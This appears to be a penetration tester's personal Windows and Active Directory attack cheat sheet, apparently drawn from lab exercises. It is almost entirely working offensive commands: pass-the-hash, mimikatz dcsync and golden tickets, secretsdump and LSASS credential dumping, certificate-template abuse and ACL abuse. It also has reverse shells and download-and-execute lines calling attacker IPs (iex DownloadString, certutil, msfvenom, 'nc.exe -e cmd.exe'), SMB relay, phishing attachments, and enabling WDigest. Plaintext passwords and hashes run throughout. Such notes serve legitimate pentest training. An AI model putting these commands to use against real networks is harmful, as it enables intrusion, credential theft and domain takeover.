crackmapexec smb 10.10.10.15-24 -u '' -H 5bcoe56i4645ho43h2ei534rsat -d corp.com --continue-on-success

# You can also use with a username, such as Administrator
crackmapexec smb 10.10.10.15-24 -u 'Administrator' -H 5bcoe56i4645ho43h2ei534rsat --local-auth --lsa

# This one worked
crackmapexec smb 10.10.10.15 -u 'Administrator' -H 5bcoe56i4645ho43h2ei534rsat -d svcorp --continue-on-success

proxychains -q crackmapexec smb files02 -u joe -p Flowers1 --spider ADMIN$ --regex .
```

Execute remote commands:

```bash
crackmapexec winrm -u 'pete' -H <ntlm hash> --local-auth
```

Kerberos:
```bash
cat matthew.b64 | base64 -d > matthew.ccache
export KRBCCNAME=$(pwd)/matthew.ccache
klist

proxychains -q crackmapexec smb corp.com --kerberos --continue-on-success # Must provide FQDNs

# Use cme to list the domain
proxychains -q crackmapexec smb 10.10.10.1X/24
# Add the FQNs to a targets file
...
# Retrieve hashes from password
proxychains crackmapexec smb dev02-corp -u Administrator -p Password123! --local-auth --lsa

# Dump hashes for other users
proxychains crackmapexec smb web02-corp -u Matthew.Lucas -H 5bcoe56i4645ho43h2ei534rsat --lsa
```

#### Enter Powershell Session as Another User

```bash
PS C:\Users\dave> $password = ConvertTo-SecureString "Dolphin1" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("sql_svc", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName MS02 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin
```

#### RDP Session Inception

```bash
Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:dev04.medtech.com"
```

#### Force to Reset Password

```bash
# Import the PowerView module
iex (new-object net.webclient).DownloadString('http://192.168.45.231/PowerView.ps1')
# Convert the new password to a secure string                                  
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
# Create a PSCredential object with an account that has permissions to reset   
passwords	
$Cred = New-Object System.Management.Automation.PSCredential('web02.dmz.medtech.com\\Administrator', (ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText -Force))

# Reset the password for the user 'nina'                                       
Set-DomainUserPassword -Identity 'Administrator' -AccountPassword $UserPassword -Credential $Cred -Verbose
# If you need to set the password for another user, repeat the process with the correct details
# For example, for a user named 'User.Name':
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('web02\Administrator', $SecPassword)
# Reset the password
Set-DomainUserPassword -Identity 'Administrator' -AccountPassword $UserPassword -Credential $Cred -Verbose
# Optionally, if you need to set a script path for the user object             
# Replace <User.Name>, $ip, <file> with actual values                          
Set-DomainObject -Identity 'User.Name' -Set @{"scriptpath"="\\$ip\share\<file>.bat"} -Credential $cred -Verbose            
```

#### Executing Remote Commands

```bash
# With a ticket
impacket-atexec -k admin02.corp.com "powershell -enc <command>"
# With password
impacket-psexec "web02/administrator:<password>@web02.corp.com" -c <path to binary>
# Get a shell with ntlm hash
impacket-psexec 'web02/administrator'@10.10.10.15 -hashes ':5bcoe56i4645ho43h2ei534rsat' # maybe take quotes off of domain/user
# Dump secrets from kali machine
impacket-secretsdump svcorp/pete@10.10.10.15 -hashes ':5bcoe56i4645ho43h2ei534rsat'
# Using evil win-rm with hash
evil-winrm -i 10.10.10.15 -u pete -H 5bcoe56i4645ho43h2ei534rsat
upload msfvenom_shell.exe # For a better shell
C:\Windows\Tools\msfvenom_shell.exe # Execute executable

# PsExec64.exe, make sure this file is transferred
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

#### WMI and WinRM for Remote Commands and Shells

WMI is great for creating processes on a remote windows machine using either a password or hash. The authentication must be part of the Local Administrators. It uses port 135 for remote procedure calls.

```bash
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3948           0 192.168.50.73
```

```bash
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

```bash
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```

#### Amazing Enumeration Cheatsheet

https://wadcoms.github.io

#### After You Compromise DC

Do dcsync to get hashes of all of the domain controllers. Be persistant. 

#### Installing OpenSSH

Run as admin in powershell:

Check if OpenSSH is available by running the following command:
```bash
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
```

Install the OpenSSH Server component by running the following command:

```bash
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
```

#### RDP From PowerShell

```bash
Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:172.16.173.7"
 ```

#### Pass the Hash

Bunch of examples, "https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/".

If you can't crack the NTLM hash, you can always pass it. This resource walks you through it, 'https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash'. 

#### Other Resources

"https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash"

 #### Recursively Look for a Word

```bash
Get-ChildItem -Path C:\Users -Recurse| Select-String -Pattern "password" | Select-Object Path, LineNumber, Line
Get-ChildItem -Path . -Recurse| Select-String -Pattern "password" | Select-Object Path, LineNumber, Line
```

#### For Modifiable Executables but Unknown Process, Watch What's Going on

```bash
Get-Process | Watch-Command -Difference -Continuous -Verbose
Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Verbose
```

#### Switch File Permissions

```bash
icacls "C:\Windows\Tasks\file.log" /grant Everyone:F
```

Do the following for ssh keys:

```bash
icacls "..\Documents\sarah_ssh.txt" /reset
icacls "..\Documents\sarah_ssh.txt" /inheritance:r
icacls "..\Documents\sarah_ssh.txt" /grant:r "$($env:USERNAME):(R)"
```

#### WinPeas Messed up Color

This should fix it:

```bash
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 
```

#### Latest Good WinPeas release

"https://github.com/peass-ng/PEASS-ng/releases/tag/20240221-e5eff12e"

#### Open Port

```bash
New-NetFirewallRule -DisplayName "SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
```

#### Privesccheck

It was recommended to use this in addition to winpeas, 'https://github.com/itm4n/PrivescCheck'.

#### Golden Ticket

```bash
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
mimikatz # misc::cmd # Launch a new command prompt
```

```bash
# Verify
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
```

#### If You Find a Weird Hash

```bash
type automation.txt
01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000...

echo "01000000d08c9ddf0115d1118c7a00c0..." > cred.txt

$pw = Get-Content cred.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword
hHO_S9gff7ehXw
```

#### Refer to NXC.sh for some cool uses

Save all hashes, passwords, and users in a file so that you can automate the enumeration process of various protocols.

#### If None of Your Commands Work

If you're in a shit shell, try exporting a proper path:

```bash
set PATH=%SystemRoot%\system32;%SystemRoot%;
```

#### Locally Running Apps

Look through the applications in "c:\program files" and "c:\program files (x86)", and run them through the exploit database to see if you can abuse a public privilege escalation.

#### Chisel

```bash
kali@kali:~/beyond$ chmod a+x chisel
kali@kali:~/beyond$ ./chisel server -p 8081 --reverse
C:\windows\tasks> iwr -uri 192.168.45.163:8000/chisel.exe -o chisel.exe
C:\windows\tasks> .\chisel.exe client 192.168.45.163:8081 R:8082:172.16.197.241:80
# Could replace 172.* with localhost
# Go to 127.0.0.1
```

#### SMB Signing Disabled

Possible SMB relay attack:

```bash
# mail server ip (target for relay attack)
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.241.242 -c "powershell -enc JABjAGwAaQ..."
# trigger by reaching out to your server (ip) by whatever means, in this case it was changing the backup migration location on wordpress to my //$ip/test
```

#### SharpGPOAbuse

```bash
. .\PowerView.ps1
Get-GPO -Name "Default Domain Policy"
Get-GPPermission -Guid <ID from above> -TargetType User -TargetName anirudh
# Look for GpoEditDeleteModifySecurity
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
gpupdate /force

psexec.py $ip/anirudh:SecureHM@$ip
``` 

#### Piping Password in Windows

If you see something unusual, but it requires a password and it just skips over the password for whatever reason (doesn't let you input one), echo and pipe the password

```bash
cmd.exe /c echo Freedom1 | .\admintool.exe whoami
```

#### Abusing Backup Operator Privileges

From Blackfield.

Transfer the following script.txt onto the machine:

```bash
set verbose onXREG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
set metadata C:\Windows\Temp\meta.cabX
set context  clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

Then run:

```bash
diskshadow /s script.txt
...
cd E:\Windows\ntds
dir
cd C:\Windows\Temp
robocopy /b E:\Windows\ntds . ntds.dit
reg save hklm\system C:\Windows\Temp\System
```

#### Clear Text Passwords

```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
dir /s /p proof.txt
dir /s /p local.txt
```

#### Windows Services - insecure file persmissions

````bash
get-service
get-service ApacheHTTPServer | get-member
get-service ApacheHTTPServer | Select-Object *
Get-CIMInstance -Class Win32_Service -Filter "name ='MSSQL' " | Select-Object *
Get-CIMInstance -Class Win32_Service -filter "StartName != 'LocalSystem' AND NOT StartName LIKE 'NT Authority%' " | Select-Object * | Sort-Object StartName
wmic service list brief
sc query
.\accesschk.exe -ucqv ApacheHTTPServer -accepteula
.\accesschk.exe -wvud ApacheHTTPServer -accepteula # What the pro useus
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
````

#### Interesting Registry Keys

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### AD Lateral Movement

##### Network

```bash
nslookup #use this tool to internally find the next computer to pivot to.
example-app23.example.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
Address: 10.11.1.121
```

###### SMB

```bash
impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
impacket-psexec -hashes lm:ntlm zenservice@192.168.183.170
```

###### WINRM

```bash
evil-winrm -u <user> -p <password> -i 172.16.138.83
evil-winrm -u <user> -H <hash> -i 172.16.138.83
```

###### WMI

```bash
proxychains -q impacket-wmiexec forest/bob:'password'@172.16.138.10
impacket-wmiexec forest/bob:'password'@172.16.138.10
```

###### RDP

```bash
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be2cnzxlcjei9cxzc9x
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
```

###### Accessing shares with RDP

```bash
windows + R
type: \\172.16.120.21
Enter User Name
Enter Password
[now view shares via rdp session]
```

#### TGT Impersonation

```bash
PS> klist # should show no TGT/TGS
PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by auth to network share on the computer
PS> klist # now should show TGT/TGS
PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
```

#### Domain Controller Synchronization

To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file, which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.

```bash
.\mimikatz.exe
privilege::debug
lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
lsadump::dcsync /user:dcorp\krbtgt

Credentials:
  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
...
kali@kali: impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
````

See who can do dcsync.

```bash
Get-ObjectAcl -DistinguishedName "dc=nagoya-industries,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

#### Exploiting Certificate Authority

If LDAP is open, you can try to connect to LDAP through your browser, 'https:10.10.11.202:3269/', and check whether the box is a certificate authority. If it is, you can upload Certify.exe to the machine once you have initial access and exploit it.

You can also see it when you run winpeas towards the end in the certificate section. 

```bash
# This'll give you some information to put into BloodHound
certipy-ad find -u hazel.green -p haze1988 -dc-ip 192.168.165.40
# Vulnerable ?
certipy-ad find -u hazel.green -p haze1988 -dc-ip 192.168.165.40 -stdout -vulnerable
# Molly is basically head Domain Admin. Seems like the quotes made a difference
certipy-ad req -u hazel.green -p haze1988 -target dc.hokkaido-aerospace.com -upn 'molly.smith@hokkaido-aerospace.com' -ca 'hokkaido-aerospace-DC-CA'
certipy req -u hazel.green -p haze1988 -target hokkaido-aerospace.com -upn administrator@hokkaido-aerospace.com -ca hokkaido-aerospace-DC-CA  --template UserAuthentication
```

```bash
# Taken from Certify's Github Page
.\Certify.exe find /vulnerable
.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:adminstrator /outfile:C:\Windows\Tasks\cert.pem
certipy-ad req -u hazel.green@hokkaido-aerospace.com -p haze1988 -target-ip dc.hokkaido-aerospace.com -ca 'hokkaido-aerospace-DC-CA' -template 'User' -upn 'Molly.Smith@hokkaido-aerospace.com'
certipy-ad req -u hazel.green -p haze1988 -target-ip dc.hokkaido-aerospace.com -upn Hazel.Green@hokkaido-aerospace.com -ca hokkaido-aerospace-DC-CA -template
# Paste the RSA PRIVATE KEY in cert.pem file
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### GenericAll Exploitation & Using Kerberos Ticket

I discovered this path in BloodHound.

```bash
. .\Powermad.ps1
. .\PowerView.ps1
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer attackersystem | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe hash /password:Summer2018!
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/attackersystem.support.htb /ptt

# Copy the Base 64 ticket output and transfer it to Windows (because I'm in evil-winrm and using it within Windows isn't working). Remove all spaces in vi with '%s/ //g', decode the base64, then use ticketConverter.py to convert the ticket to a .ccache file that we can use to login as adminsitrator.
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass

# You could also use smbexec.py, wmiexec.py, atexec.py, dcomexec.py from Linux to authenticate

# On Windows
Once you get ticket, to access drive as admin.
>net use O: \\dc.help.htb\C$
>O:
```

Alternatively:

```bash
net user hacker Hacker123! /add /domain
# Target Group
net group "EXCHANGE WINDOWS PERMISSIONS" /add hacker
```

#### WriteOwner Exploitation

I discovered this path in BloodHound.

```bash
# The user's password that you're exploiting with
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDGodd', $SecPassword)
# TargetIdentity is the group that you're targeting
Set-DomainObjectOwner -Identity "Core Staff" -OwnerIdentity JDGodd -Credential $Cred
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity JDGodd
#Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -Rights WriteMembers
# Members is who you want to add, user that you have a shell with
Add-DomainGroupMember -Identity 'Core Staff' -Members 'nikk37' -Credential $Cred
Get-DomainGroupMember -Identity 'Core Staff'
#Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers
```

#### WriteDacl Exploitation

I discovered this path in BloodHound.

```bash
$SecPassword = ConvertTo-SecureString 'Hacker123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
lsadump::dcsync /domain:htb.local /user:Administrator
# Or
/opt/windows/DCSync/DCSync.py -dc htb.local -t 'CN=hacker,CN=Users,DC=htb,DC=local'  hackerAdministrator:Hacker123!
secretsdump.py htb.local/hacker:Hacker123\!@$ip
```

#### SeBackupPrivilege

```bash
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
cd Temp
download sam
download system

secretsdump.py -sam sam -system system local
```

If that isn't good enough..

```bash
mkdir c:\temp
cd c:\temp

### back_script.txt
set verbose on 
set metadata C:\Windows\Temp\meta.cab 
set context clientaccessible 
set context persistent 
begin backup 
add volume C: alias cdrive 
create 
expose %cdrive% E: 
end backup 
###

diskshadow /s back_script.txt
robocopy /b E:\Windows\ntds . ntds.dit

secretsdump.py -ntds ntds.dit -system system local 
```

#### SeRestorePrivilege

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 EXITFUNC=thread -f exe > binary.exe
upload binary.exe
sudo nc -lvnp 80
.\SeRestoreAbuse.exe "cmd /c C:\windows\tasks\binary.exe"

.\EnableSeRestorePrivilege.ps1
if access to RDP and C:\Windows\System32 then you an do the utilman exploit.
```

#### Exploiting Service (think I meant..) Server Operators Group Membership

```bash
services # look for True
upload nc.exe
sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
nc -lvnp 1234
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$myip LPORT=$port EXITFUNC=thread -f exe > shell.exe

sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

#### ForceChangePassword


#### Read LAPS

```bash
# Valid credentials for your user that you have a shell with
$SecPassword = ConvertTo-SecureString 'get_dem_girls2@yahoo.com' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\nikk37', $SecPassword)
Get-DomainObject DC -Credential $Cred -Properties "ms-mcs-AdmPwd",name
#Get-ADComputer DC -Properties ms-msc-admpwd
```

#### Impacket Attacks

Get users:

```bash
impacket-GetADUsers -dc-ip $ip "exampleH.example/" -all
impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
```

AS-REP Roasting:

```bash
# Searches for all vulnerable users
GetNPUsers.py "EGOTISTICAL-BANK.LOCAL/fsmith"
GetNPUsers.py help.htb/ -dc-ip $ip -request
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip 'DOMAIN/'
```

Kerberoasting:

```bash
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip '$dom/'
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip $dom/user:password
```

Dump hashes for users, needs admin or sam/security/system files:

```bash
impacket-secretsdump admin:password@$ip -outputfile hashes
/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
```

WMI shell:

```bash
impacket-wmiexec forest/bob:'password'@$ip
```

SMB shell:

```bash
smbexec.py test.local/john:password123@$ip
```

#### ntpdate

Whenever you're pentesting a windows network or computer, just fucking take the time to run:

```bash
sudo ntpdate $ip
```

####  Logins not Working with Password? Try with TGT!

Go to https://codebeautify.org.

```bash
getTGT.py $dom/john -dc-ip $ip -hashes :6DFCB20C87D04F9A4F9605F2413395D4
```

#### Targeted Kerberoasting ??

```bash
source /opt/windows/targetedKerberoast/venv/bin/activate
python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $ip
```

#### Malicious email

```bash
python /opt/mmg-ods.py windows 192.168.45.178 80
sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.218.140 --body body.txt --header "Subject: Staging Script"
```
```
sudo swaks -t neil@bratarina --from _smtpd@COFFEECORP --attach @bad.odt --server $ip --body body.txt --header "Subject: Staging Script"
```
https://github.com/gtworek/Priv2Admin
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#kerberoast
https://github.com/bitsadmin/wesng

#### WerTrigger

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=6969 -f dll > phoneinfo.dll

# Place files into system32 as an administrator
select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';

cd C:\windows\system32
.\WerTrigger.exe
```https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#sam-and-system-files
```

#### Watch over DLLs in a folder

```bash
$folderPath = "C:\java\jre\bin" ; if (!(Test-Path $folderPath -PathType Container)) {     New-Item -ItemType Directory -Path $folderPath | Out-Null } $envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine") ; if ($envPath -notlike "*$folderPath*") {     $newPath = "$envPath;$folderPath"  ;   [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine") }
```

#### Getting a Reverse Shell from SMB (Windows)

You can create a .lnk file with hashgrab.py and impacket's smb server:

```bash
python3 /opt/hashgrab.py 192.168.45.163 test
sudo responder -I tun0
# or impacket-smbserver share share -smb2support
smbclient \\\\$ip\\nara
put test.lnk
# look for hashes in smb server
```

#### Kerberos and Certificates

"https://github.com/nturley3/zeek-kerberos-haters-guide"

#### Extract Hashes from LSASS Dump

```bash
pypykatz lsa minidump lsass.DMP
```

#### Enable WDigest on Newer Machines

While WDigest is disabled on newer machines, it is possible for attackers to enable it so plaintext credentials once a user logs in. WDigest can be enabled by setting the necessary registry key to “1” instead of “0”: 

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
```

```bash
nxc smb 192.168.0.76 -u testadmin -p Password123 -M wdigest -o action=enable
```


#### Sid to Name - Name to Sid

```bash
# SID to Name
convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601

# Name to SID
Get-DomainSID -Domain child.red.com
```

#### UAC Bypass

```bash
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;. .\UACBypass.ps1
```

#### PWNED

```bash
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: & type "C:\Users\Administrator\Desktop\proof.txt" 2> nul & type "C:\Documents and Settings\Administrator\Desktop\proof.txt" 2> nul & type %USERPROFILE%\Desktop\proof.txt 2> null
```

#### Executing MSI Package

```bash
msiexec /i c:\users\smelly\desktop\aie.msi /quiet /qn /norestart
```